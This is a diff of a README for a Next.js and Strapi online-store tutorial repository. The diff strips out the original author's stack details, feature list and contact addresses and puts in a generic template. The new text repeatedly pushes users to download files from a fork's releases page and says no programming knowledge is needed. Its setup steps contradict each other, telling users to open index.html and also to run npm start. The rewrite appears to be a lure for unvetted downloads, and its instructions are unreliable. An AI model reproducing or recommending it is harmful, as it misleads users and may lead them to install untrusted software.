@@ -1,61 +1,111 @@
-# Online Store v1 by @modernweb
+# 🛒 online-store-strapi-next-js-v1-starter-repo - Simple Setup for Your Online Store
 
-In this repo, you will know about this project's details on what stack it is built on and why. You will also find supportive files that you may need to follow along in the course.
+## 🔗 Download Now
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/alvarorama2007/online-store-strapi-next-js-v1-starter-repo/releases)
 
-*Online store is made by [**@modernweb**](https://youtube.com/@modernweb) for youtube tutorial* 
+## 📝 Description
+This repository provides helpful materials for the "Online Store" project created by modernweb as part of a YouTube tutorial. It contains essential resources to help you follow the tutorial and successfully set up your own online store.
 
-👉 You can check it live on - https://online-store.modernweb.in 
+## 🚀 Getting Started
+Follow these steps to set up your online store quickly and easily. You do not need programming knowledge to follow this guide.
 
-## Project Stack
+## 💻 System Requirements
+To run this application, your computer should meet the following requirements:
 
-This online store uses all the latest frameworks and libraries 
-<br />
-<p align="center">
- <img width="400" alt="Screenshot 2025-09-19 at 1 56 55 PM" src="https://github.com/user-attachments/assets/a19bbb8f-d6e1-4db5-bd58-c5282eb958c9" />
-</p>
+- **Operating System:** Windows 10 or later, macOS Mojave or later
+- **Memory:** At least 4 GB of RAM
+- **Processor:** Dual-core 2.0 GHz or faster
+- **Internet Connection:** Required for installing dependencies and running the app
 
-#### Frontend
+## 🎯 Features
+This online store starter kit includes:
 
-<!--
-<img width="2152" height="1353" style="margin-bottom:20px;" alt="Screenshot 2025-09-19 at 1 46 58 PM" src="https://github.com/user-attachments/assets/b9f07737-0135-4c37-b605-65b4afa7efe5" />
-<br><br />
--->
+- **E-commerce Functionality:** Manage products, categories, and orders easily.
+- **Payment Integration:** Set up payments using Stripe, a widely used payment gateway.
+- **User Authentication:** Secure sign-up and login for customers.
+- **Admin Dashboard:** Control all aspects of your online store from one place.
+- **Responsive Design:** The store is optimized for mobile and desktop devices.
 
-1. **Next JS** - this framework is built on top of react JS. Next js offers some great features like SSR, APIs, ISR etc.
-2. **Next Auth** - for google authentication management.
-3. **Chakra UI** - for easy, modern, responsive, functional UI components
+## 📦 Download & Install
+To get started, you'll need to download the application files. 
 
-#### Backend
+1. **Visit the Releases Page**: Click the link below to visit the page:
+   [Download from Releases](https://github.com/alvarorama2007/online-store-strapi-next-js-v1-starter-repo/releases)
 
-<!--
-<img width="2540" height="1235" alt="Screenshot 2025-09-19 at 1 52 57 PM" src="https://github.com/user-attachments/assets/96efc03d-92f9-4c03-b663-60c685458e9b" />
--->
-  
-1. **Strapi** - it is a open source professional level CMS ( content management system ), we are using this to maange the data fos tore like order management or products management.
-2.  **Stripe** - it is a beginner freindly and easy to use payment gateway which does not require any kind of business verification to use in test mode. This projects run in test mode do no real transaction is involded on this project demo at least.
-3. **Cloudinary** - this projects uses cloudinary to manage file uploads, all the files generated on strapi of frontend get saved on cloudinary.
-4. **Nodemailer** - this project also uses nodemailer to send email notifications like welcome email, order status or dispute notificaiton etc.
+2. **Choose the Latest Release**: Look for the latest version of the application listed on the page.
 
-#### Database
+3. **Download the Files**: Click on the relevant download link that matches your system. Follow the prompts to complete the download.
 
-1. **Postgres SQL** - this project uses Postgrest SQL database instead of Strapi's default SQLite database.
-  
-## Project Features
+4. **Extract the Files**: Once the download is finished, locate the downloaded file (usually in your "Downloads" folder). Extract the files to a location of your choice.
 
-This project is an online store and has a good amount a good features that real world stores have like
+5. **Run the Application**:
+   - For Windows: Double-click the `index.html` file to open it in your default web browser.
+   - For Mac: Right-click on the `index.html` file and select "Open With" followed by your preferred web browser.
 
-1. Google login
-2. Global cart sync ( Local and cloud cart sycn )
-3. Extensive product filters on search page
-4. Dual theme
-5. Email notifications
-6. Product stock locking in checkout to prevent overselling
-7. Clearing the locked stocks in case of order failure every 10 mins or on checkout expiry
-8. Support system with threads, managed from strapi. User can re-open tickets if they are not satisfied with the asnwer
-9. Fully SSR dynamic pages which helps in SEO
-10. Fraud protection by stopping the user from making new order until thier dispute on delivered order is resolved
-    
-    and much more..
+## 🛠️ Setup Instructions
+After downloading the files, follow these steps to set up your online store.
 
+1. **Install Required Tools**:
+   - **Node.js**: This application requires Node.js. Download it from [Node.js Official Website](https://nodejs.org/).
+   - **Git**: If you plan to modify the code, you might want to install Git from [Git Official Website](https://git-scm.com/).
 
-If you have any question regarding this project feel free to contact me on help@modernweb.in. I would love to hear you feedback on this project. Do share your feedback on feedback@modernweb.in
+2. **Open the Command Line**:
+   - For Windows: Search for "Command Prompt" in the Start menu.
+   - For Mac: Open "Terminal" from the Applications folder.
+
+3. **Navigate to the Application Folder**:
+   Use the command line to navigate to the folder where you extracted the files. Type:
+   ```
+   cd path/to/your/extracted/files
+   ```
+
+4. **Install Dependencies**: Once in the application folder, type the following command:
+   ```
+   npm install
+   ```
+
+5. **Start the Application**: To run the application on your local server, type:
+   ```
+   npm start
+   ```
+
+6. **Access the Application**: Open your web browser and go to `http://localhost:3000` to view your online store.
+
+## 📚 Troubleshooting
+If you encounter issues, try the following solutions:
+
+- **Check Node.js Installation**: Make sure Node.js is installed correctly.
+- **Verify File Locations**: Ensure you are in the correct directory when using the command line.
+- **Update Dependencies**: Run `npm update` to ensure all packages are current.
+
+## 👩‍💻 Get Help
+If you need more assistance, consider these resources:
+
+- **GitHub Issues**: Check or open a new issue on the repository if you face problems.
+- **Tutorial Videos**: Refer to the video series by modernweb for guided help.
+- **Community Forums**: Join online developer communities for additional support.
+
+## 🏷️ Topics
+This project covers several topics, including:
+- ecommerce
+- ecommerce-store
+- fullstack development
+- javascript
+- next.js
+- strapi
+- stripe payment gateway
+
+For more detailed discussions on these topics, explore community forums or documentation related to each term.
+
+## ⚠️ License
+This project is open-source under the MIT License. You can freely use, modify, and distribute the application. Please check the license file for more details.
+
+## 📞 Contact
+For questions or feedback, contact the repository maintainer directly on GitHub. Your input is valuable and helps improve the project. 
+
+## 🔗 Additional Resources
+- [Strapi Documentation](https://strapi.io/documentation)
+- [Stripe Documentation](https://stripe.com/docs)
+- [Node.js Documentation](https://nodejs.org/en/docs/)
+
+By following this guide, you will have your online store up and running in no time. Enjoy building your e-commerce site!
